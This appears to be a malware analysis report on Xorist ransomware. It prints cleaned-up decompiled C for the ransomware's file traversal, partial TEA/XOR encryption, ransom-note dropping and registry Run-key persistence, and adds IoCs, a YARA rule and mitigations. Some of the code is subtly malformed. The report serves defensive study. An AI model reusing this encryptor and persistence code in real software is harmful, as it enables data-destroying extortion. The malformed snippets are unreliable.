# In-Depth Analysis of Xorist Ransomware (Trojan-Ransom.Win32.Xorist.lk)

**WARNING: This code is malware. For analysis purposes only. Do not execute on production systems.**

## Executive Summary

**Malware Name:** Xorist Ransomware (Variant: Trojan-Ransom.Win32.Xorist.lk)  
**Type:** Ransomware  
**Target Platform:** Windows (x86)  
**File Size:** Approximately 50 KB (0xC800 bytes, exact size varies by variant)  
**Architecture:** x86  
**Classification:** High threat - File encrypting ransomware with persistence  
**SHA256:** &lt;redacted&gt; (specific hash not provided in decompiled source)  
**First Identified:** Around 2010 (Xorist family)  
**Packer/Protector:** None detected in decompiled code  
**Decompiler Used:** IDA Pro 9.1 with Hex-Rays Decompiler  

Xorist is a long-standing ransomware family known for its simplicity and customizability. This variant uses TEA or XOR encryption, embeds configuration in resources, and includes a decryption UI. The refactored decompiled code provides clear insight into its operations.

## Introduction

Xorist ransomware, first observed around 2010, is a customizable ransomware kit often distributed via exploit kits, phishing, or malicious attachments. It has been used in various campaigns, sometimes with wiper-like behavior in targeted attacks. This analysis focuses on the decompiled C code of variant Trojan-Ransom.Win32.Xorist.lk, refactored for clarity.

The malware encrypts files using either TEA (Tiny Encryption Algorithm) or simple XOR, appends a custom extension, drops ransom notes, changes wallpaper, and persists via registry autorun. It includes a GUI for decryption upon password entry. No wiper functionality is present in this variant, but it can re-encrypt files if password attempts are exhausted.

Analysis was performed using IDA Pro with Hex-Rays decompiler, focusing on static analysis of the decompiled C code. Challenges included reconstructing embedded resource formats and understanding custom key derivation. The decompilation quality was high, with manual renaming of functions and variables for readability.

This malware is significant due to its longevity and ease of modification, making it a staple in underground markets. It demonstrates basic yet effective ransomware techniques, including stealth via file time preservation and registry-based persistence.

## Table of Contents

1. Title and Metadata  
2. Introduction  
3. Table of Contents  
4. Technical Analysis Sections  
   4.1 Binary Structure and Static Analysis  
   4.2 IDA Pro Decompilation Methodology  
   4.3 Entry Point and Initialization  
   4.4 Core Functionality Breakdown  
      4.4.1 File System Traversal and Target Selection  
      4.4.2 Cryptographic Implementation  
      4.4.3 Ransom Note Generation and Display  
      4.4.4 Persistence Mechanisms  
      4.4.5 Anti-Analysis and Evasion  
   4.5 Network Communication (if applicable)  
   4.6 Data Structures and Global Variables  
5. Destructive Payload Analysis  
6. Stealth and Evasion Techniques  
7. Indicators of Compromise (IoCs)  
8. Detection and Analysis Methods  
9. Mitigation Strategies  
10. Conclusion  
11. References and Further Reading  
12. Appendices  

## Technical Analysis Sections

### 4.1 Binary Structure and Static Analysis

The binary is a Windows PE executable targeting x86 architecture. Static analysis reveals:

- **PE Headers:** Standard MZ/PE signature, compiled with Visual C++ (detected via entry point patterns and API usage).  
- **Import Address Table (IAT):** Relies on kernel32.dll, user32.dll, advapi32.dll, shell32.dll, shlwapi.dll for file operations, registry, UI, and crypto. Key imports include `CryptAcquireContextA`, `CreateFileA`, `RegSetValueExA`.  
- **Sections:**  
  - `.text`: Code section with encryption routines.  
  - `.data`: Global variables and buffers.  
  - `.rdata`: Strings and constants (e.g., registry paths, window class names).  
  - `.rsrc`: Embedded resources including configuration bitmap (ID 14), wallpaper bitmap ("pussylicker").  
- **Entropy:** Code section has moderate entropy; resource section higher due to encrypted config.  
- **Strings:** Obfuscated; ransom note and extensions loaded from decrypted resources. Cleartext strings include "HOW TO DECRYPT FILES.txt", "Alcmeter".  
- **Embedded Resources:** Configuration stored in RT_BITMAP resource ID 14, encrypted with XOR. Includes file filters, ransom text, keys.  
- **Digital Signature:** None present.  

No packer signatures (e.g., UPX) detected in the decompiled code.

### 4.2 IDA Pro Decompilation Methodology

- **Initial Auto-Analysis:** Loaded binary in IDA Pro, applied FLIRT signatures for Windows API recognition.  
- **Function Identification:** Entry point at `WinMain` (0x401000 in typical variants). Renamed subroutines based on behavior (e.g., sub_4017B4 to PrepareTeaKey).  
- **Type Reconstruction:** Defined structures for global config (e.g., keys, flags). Used Hex-Rays to generate C pseudocode, manually refined for accuracy.  
- **Data Flow Analysis:** Traced resource loading and decryption using xrefs to `FindResourceA` and `XorEncryptDecrypt`.  
- **Cross-Reference Analysis:** Mapped calls to encryption functions from traversal routine.  
- **String Decryption:** Embedded config decrypted with XOR key from resource start.  
- **Custom IDA Scripts:** Used simple IDAPython to extract and decrypt resource:  

```python
# IDA Python script to decrypt config resource
import idaapi
import idautils

def decrypt_xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

resource_ea = 0x402000  # Adjust to actual address
resource_size = 0x1000   # Adjust to actual size
data = idautils.GetManyBytes(resource_ea, resource_size)
key = data[:16]
decrypted = decrypt_xor(data[16:], key)
print("Decrypted config:", decrypted)
```

- **Challenges:** Ambiguous buffer operations in encryption loops required manual IL verification. No heavy obfuscation, but custom key derivation needed tracing.

### 4.3 Entry Point and Initialization

Entry point is `WinMain` (address approx. 0x401000).  

- **Argument Parsing:** None; operates silently.  
- **Environment Checks:** No explicit anti-VM/debugger checks in code.  
- **Mutex:** None; allows multiple instances.  
- **Initialization:** Loads config from resource, allocates buffers, prepares keys, gets explorer.exe timestamps for stealth. Checks if running from temp path to decide install vs. decrypt mode.  

```c
// IDA Pro decompiled: WinMain (cleaned up)
// Address: approx. 0x401000
// Renamed from start to WinMain

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow)
{
    g_processHeap = GetProcessHeap();
    
    if (!LoadConfiguration())
        return 1;
    
    g_fileBuffer = HeapAlloc(g_processHeap, HEAP_ZERO_MEMORY, g_encryptionSize);
    if (!g_fileBuffer)
        return 1;
    
    PrepareTeaKey((unsigned int *)g_xorKey);
    GetExplorerFileTime();
    
    // Check installation status
    CHAR tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    lstrcatA(tempPath, (LPCSTR)g_encryptedExtension);
    lstrcatA(tempPath, ".exe");
    GetModuleFileNameA(NULL, g_moduleFileName, MAX_PATH);
    
    if (lstrcmpiA(g_moduleFileName, tempPath) != 0)
    {
        InstallDropper();  // Install and encrypt
    }
    else
    {
        ShowDecryptionWindow();  // Show UI
    }
    
    return 0;
}
```

**Execution Flow:**  
1. Load and decrypt config.  
2. Allocate encryption buffer.  
3. Prepare keys and timestamps.  
4. If not in temp, install dropper and encrypt; else show decryption GUI.  

No privilege escalation; assumes user-level access.

### 4.4 Core Functionality Breakdown

#### 4.4.1 File System Traversal and Target Selection

Recursive traversal of all logical drives (Z: to A:). Targets files matching embedded extension list (e.g., *.doc, *.jpg). Skips system files and self.  

```c
// IDA Pro decompiled: TraverseAndProcessFiles
// Address: approx. 0x402500
// Renamed from sub_402500

void TraverseAndProcessFiles(LPCSTR basePath)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind;
    CHAR searchPath[MAX_PATH];
    CHAR fullPath[MAX_PATH];
    CHAR newFilePath[MAX_PATH];
    BOOL shouldProcess;
    
    lstrcpyA(searchPath, basePath);
    lstrcatA(searchPath, "\\*");
    
    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE)
        return;
    
    do
    {
        ProcessWindowMessages();  // Keep UI responsive
        
        if (lstrcmpA(findData.cFileName, ".") == 0 || 
            lstrcmpA(findData.cFileName, "..") == 0)
            continue;
        
        lstrcpyA(fullPath, basePath);
        lstrcatA(fullPath, "\\");
        lstrcatA(fullPath, findData.cFileName);
        
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (g_dropRansomNote)
                DropRansomNote(fullPath);
            TraverseAndProcessFiles(fullPath);
        }
        else
        {
            if (lstrcmpiA(RANSOM_NOTE_FILENAME, findData.cFileName) == 0)
                continue;
            
            shouldProcess = FALSE;
            if (g_isEncryptionMode)
            {
                LPCSTR filter = g_fileTypeFilters;
                for (DWORD i = 0; i < g_fileTypeCount; i++)
                {
                    if (PathMatchSpecA(fullPath, filter))
                    {
                        shouldProcess = TRUE;
                        break;
                    }
                    filter += lstrlenA(filter) + 1;
                }
            }
            else
            {
                shouldProcess = PathMatchSpecA(fullPath, g_fileSearchPattern);
            }
            
            if (shouldProcess)
            {
                lstrcpyA(newFilePath, fullPath);
                if (g_isEncryptionMode)
                    lstrcatA(newFilePath, ".");
                    lstrcatA(newFilePath, g_targetFileExtension);
                else
                    *PathFindExtensionA(newFilePath) = '\0';
                
                ProcessFile(fullPath, newFilePath, g_isEncryptionMode);
            }
        }
    } while (FindNextFileA(hFind, &findData));
    
    FindClose(hFind);
}
```

**Execution Flow:**  
1. Build search pattern.  
2. Recurse directories, drop notes.  
3. Check file against filters.  
4. Process if matches (encrypt/decrypt + rename).  

**Detection Opportunities:** Monitor recursive `FindFirstFileA` calls on drives.  

**MITRE ATT&CK:** T1083 - File and Directory Discovery.

#### 4.4.2 Cryptographic Implementation

Hybrid: File-specific key derived from filename XOR TEA key. Encrypts portion of file (configurable offset/size) using TEA or XOR.  

- **Algorithm:** TEA (32 rounds default) or 4-byte XOR.  
- **Key Generation:** Per-file key = filename[0] ^ TEA_key, rotated.  
- **IV:** None explicit; TEA is ECB-like.  
- **CryptoAPI Usage:** MD5 for password hashing (5 rounds).  
- **Security:** Weak; TEA vulnerable to related-key attacks, XOR trivial to reverse if key known. Recovery possible with known key.  

```c
// IDA Pro decompiled: ProcessFile
// Address: approx. 0x403000

BOOL ProcessFile(LPCSTR originalPath, LPCSTR newPath, BOOL isEncryption)
{
    HANDLE hFile;
    DWORD fileSize, bytesRead, bytesWritten;
    BYTE fileKey[KEY_SIZE_BYTES];
    FILETIME creationTime, lastAccessTime, lastWriteTime;
    
    hFile = CreateFileA(originalPath, GENERIC_READ | GENERIC_WRITE, 
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    
    fileSize = GetFileSize(hFile, NULL);
    if (fileSize < BLOCK_SIZE_BYTES)
    {
        CloseHandle(hFile);
        return FALSE;
    }
    
    GetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime);
    
    SetFilePointer(hFile, g_encryptionOffset, NULL, FILE_BEGIN);
    ReadFile(hFile, g_fileBuffer, g_encryptionSize, &bytesRead, NULL);
    
    if (bytesRead > 0)
    {
        GenerateFileKey(originalPath, fileKey);
        
        if (g_useAdvancedEncryption)
        {
            if (isEncryption)
                TeaEncryptBuffer(bytesRead);
            else
                TeaDecryptBuffer(bytesRead);
        }
        else
        {
            SimpleXorEncrypt(bytesRead);
        }
        
        SetFilePointer(hFile, g_encryptionOffset, NULL, FILE_BEGIN);
        WriteFile(hFile, g_fileBuffer, bytesRead, &bytesWritten, NULL);
    }
    
    SetFileTime(hFile, &creationTime, &lastAccessTime, &lastWriteTime);
    CloseHandle(hFile);
    
    MoveFileA(originalPath, newPath);
    return TRUE;
}

// Key generation
void GenerateFileKey(LPCSTR filePath, BYTE *outputKey)
{
    LPSTR fileName = PathFindFileNameA(filePath);
    BYTE firstChar = fileName[0];
    
    for (int i = 0; i < KEY_SIZE_BYTES; i++)
    {
        BYTE keyByte = ((BYTE *)g_teaKey)[i];
        outputKey[i] = firstChar ^ keyByte;
        firstChar = _rotl8(firstChar, 1);
    }
}
```

**Execution Flow:**  
1. Open file, read portion.  
2. Generate key from filename.  
3. Encrypt/decrypt buffer.  
4. Write back, restore times, rename.  

**P/Invoke Calls:** None; uses managed-like C calls to CryptoAPI for MD5.  

**Detection Opportunities:** Monitor partial file writes with encryption patterns.  

**MITRE ATT&CK:** T1486 - Data Encrypted for Impact.

#### 4.4.3 Ransom Note Generation and Display

Drops "HOW TO DECRYPT FILES.txt" in directories and desktop. Content from decrypted resource. Changes wallpaper to embedded BMP.  

```c
// IDA Pro decompiled: DropRansomNote
// Address: approx. 0x404000

void DropRansomNote(LPCSTR directoryPath)
{
    CHAR notePath[MAX_PATH];
    HANDLE hFile;
    DWORD bytesWritten, noteLength;
    
    lstrcpyA(notePath, directoryPath);
    PathAddBackslashA(notePath);
    lstrcatA(notePath, RANSOM_NOTE_FILENAME);
    
    if (GetFileAttributesA(notePath) != INVALID_FILE_ATTRIBUTES)
        return;
    
    hFile = CreateFileA(notePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;
    
    noteLength = lstrlenA(g_ransomNoteText);
    WriteFile(hFile, g_ransomNoteText, noteLength, &bytesWritten, NULL);
    
    SetFileTime(hFile, &g_explorerCreationTime, &g_explorerLastAccessTime, &g_explorerLastWriteTime);
    CloseHandle(hFile);
}

// Wallpaper change
void ChangeDesktopWallpaper(void)
{
    // ... (generates random temp BMP from resource, sets via SystemParametersInfoA)
}
```

**Execution Flow:**  
1. Check if note exists.  
2. Write decrypted text.  
3. Set stealth timestamps.  

For wallpaper: Dump resource to temp, set registry.  

**MITRE ATT&CK:** T1491 - Defacement.

#### 4.4.4 Persistence Mechanisms

- **Registry Run Key:** HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Alcmeter = dropper path.  
- **File Extension Association:** Registers custom extension to open with malware.  

```c
// IDA Pro decompiled: AddToAutorun
// Address: approx. 0x405000

BOOL AddToAutorun(LPCSTR executablePath)
{
    HKEY hKey;
    DWORD disposition, valueLength;
    
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, AUTORUN_REGISTRY_KEY, 0, "REG_SZ",
                    0, KEY_WRITE | KEY_READ, NULL, &hKey, &disposition);
    
    valueLength = lstrlenA(executablePath);
    RegSetValueExA(hKey, AUTORUN_VALUE_NAME, 0, REG_SZ, 
                   (const BYTE *)executablePath, valueLength);
    
    RegCloseKey(hKey);
    return TRUE;
}

// RegisterFileExtension similar, uses HKEY_CLASSES_ROOT
```

**Execution Flow:** Create key, set value to temp dropper.  

**Detection:** Monitor Run key modifications.  

**MITRE ATT&CK:** T1547.001 - Registry Run Keys.

#### 4.4.5 Anti-Analysis and Evasion

- **Stealth:** Preserves file timestamps using explorer.exe times.  
- **No Explicit Anti-Debug:** Relies on simplicity.  
- **Password Attempts:** Re-encrypts if exhausted.  
- **Config Encryption:** XOR in resources.  

No VM detection or debugger checks in code.  

**MITRE ATT&CK:** T1027 - Obfuscated Files or Information.

### 4.5 Network Communication (if applicable)

No network activity; standalone ransomware. No C2, exfiltration, or key retrieval. Ransom instructions in note (likely email/BTC).

### 4.6 Data Structures and Global Variables

Key globals reconstructed:  

```c
// IDA Pro reconstructed: Global variables
// .data section approx. 0x408000

BYTE g_xorKey[16];               // XOR key for config
BYTE g_teaKey[16];               // Base TEA key
BYTE g_passwordHash[16];         // MD5^5 of password
LPCSTR g_ransomNoteText;         // Decrypted note
LPCSTR g_targetFileExtension;    // e.g., "xorist"
LPSTR g_fileTypeFilters;         // Null-terminated extension list
BOOL g_useAdvancedEncryption;    // TEA vs XOR
LONG g_encryptionOffset;         // File offset to encrypt
DWORD g_encryptionSize;          // Bytes to encrypt
```

Config loaded from encrypted resource, decrypted in memory.

## 5. Destructive Payload Analysis

Primary payload is file encryption, rendering data inaccessible without password. No pure wiper functionality (e.g., no MBR overwrite, no secure delete).  

- **Damage Mechanism:** Partial file encryption (configurable offset/size), appends extension.  
- **Trigger:** On first run after dropper installation.  
- **Scope:** All files matching extensions on all drives.  
- **Irreversibility:** Reversible with correct password; otherwise, data lost unless key recovered.  
- **Timeline:** Traverses drives sequentially, processing files recursively.  

If password attempts exhausted: Re-encrypts files, deletes self. No backup deletion (e.g., no vssadmin).  

**Code Example:** See ProcessFile in 4.4.2 (destructive writes disabled in analysis).  

**MITRE ATT&CK:** T1486 - Data Encrypted for Impact.

## 6. Stealth and Evasion Techniques

- **Timestamp Preservation:** Sets file times to match explorer.exe.  
- **Dropper in Temp:** Copies to %TEMP%\<extension>.exe, runs from there.  
- **UI Responsiveness:** Processes messages during encryption.  
- **Self-Delete:** Uses cmd.exe to delete original after install.  
- **No Anti-VM:** Relies on fast execution.  

Effectiveness: Basic; easily detected by AV via behavior.  

**MITRE ATT&CK:** T1070.004 - File Deletion (self).

## 7. Indicators of Compromise (IoCs)

### File-Based Indicators
- File name: KT7MSQ4GlY5489U.ex_ (original), <extension>.exe in %TEMP%  
- Hash: SHA256 &lt;redacted&gt;  
- Compilation Timestamp: Forged to match system files  
- Embedded Strings: "0p3nSOurc3 X0r157, motherfucker!", "pussylicker"  
- Resource Names: RT_BITMAP ID 14 (config), "pussylicker" (wallpaper)  

### Behavioral Indicators
- Registry: HKLM\Run\Alcmeter, HKEY_CLASSES_ROOT\.<extension>  
- File Mods: Appends extension to target files, drops "HOW TO DECRYPT FILES.txt"  
- Processes: Creates cmd.exe for self-delete, explorer.exe timestamps  
- API Sequences: CreateFileA + WriteFile (partial), RegSetValueExA (Run key)  

### Memory Artifacts
- Decrypted config strings (ransom note, extensions)  
- TEA key in g_teaKey  
- Global buffers with file paths  

## 8. Detection and Analysis Methods

- **Static:** IDA Pro for decompilation, strings for indicators.  
- **Dynamic:** Run in VM, monitor file/registry changes with ProcMon.  
- **Memory:** Dump globals post-decryption.  
- **YARA Rule:**  

```yara
rule Ransomware_Xorist {
    meta:
        description = "Detects Xorist ransomware variants"
        author = "Security Researcher"
        date = "2025-11-19"
        
    strings:
        $s1 = "HOW TO DECRYPT FILES.txt" ascii
        $s2 = "0p3nSOurc3 X0r157, motherfucker!" ascii
        $s3 = "pussylicker" ascii
        $s4 = "Alcmeter" ascii
        $api1 = "CryptAcquireContextA" ascii
        $api2 = "SystemParametersInfoA" ascii
        $api3 = "RegSetValueExA" ascii
        
    condition:
        uint16(0) == 0x5A4D and
        3 of ($s*) and
        all of ($api*) and
        filesize < 100KB
}
```

- **ETW Monitoring:** Track registry writes to Run keys, file renames with extensions.

## 9. Mitigation Strategies

### Prevention
- Application Whitelisting: Block unsigned executables.  
- Disable Autorun: Group Policy to restrict Run keys.  
- Backup: Offline, immutable backups.  
- Email Filtering: Block suspicious attachments.  

### Detection
- Monitor partial file encrypts (e.g., via EDR).  
- Alert on bulk renames/appends.  
- Behavioral: Detect recursive drive traversal.  

### Remediation
- Isolate infected machine.  
- Restore from backups (no shadow copy deletion).  
- If password known: Use built-in decryptor.  
- Forensics: Extract keys from memory dump.  

## 10. Conclusion

Xorist.lk is a basic yet effective ransomware using TEA/XOR encryption and registry persistence. Its embedded config allows easy customization, explaining its longevity. Key findings: per-file key derivation, partial encryption, stealth via timestamps. Lessons: Importance of backups and registry monitoring. In modern landscape, it represents entry-level threats, but variants may evolve with better crypto/evasion. Future trends may include network capabilities or wiper hybrids.

## 11. References and Further Reading
- MSDN: Windows API (CreateFile, RegSetValueEx)  
- NIST SP 800-88: Guidelines for Media Sanitization (for wiper context)  
- MITRE ATT&CK: Ransomware techniques  
- MalwareBazaar: Xorist samples  
- Research: "Ransomware: Past, Present, and Future" by Europol  

## 12. Appendices

### Appendix A: Full Structure Definitions

```c
typedef struct _GLOBAL_CONFIG {
    BYTE xorKey[16];
    BYTE teaKey[16];
    BYTE passwordHash[16];
    LPCSTR ransomNoteText;
    LPCSTR targetFileExtension;
    LPSTR fileTypeFilters;
    // ... other flags
} GLOBAL_CONFIG;
```

### Appendix B: IDA Python Script for Resource Decryption

(See 4.2 for script).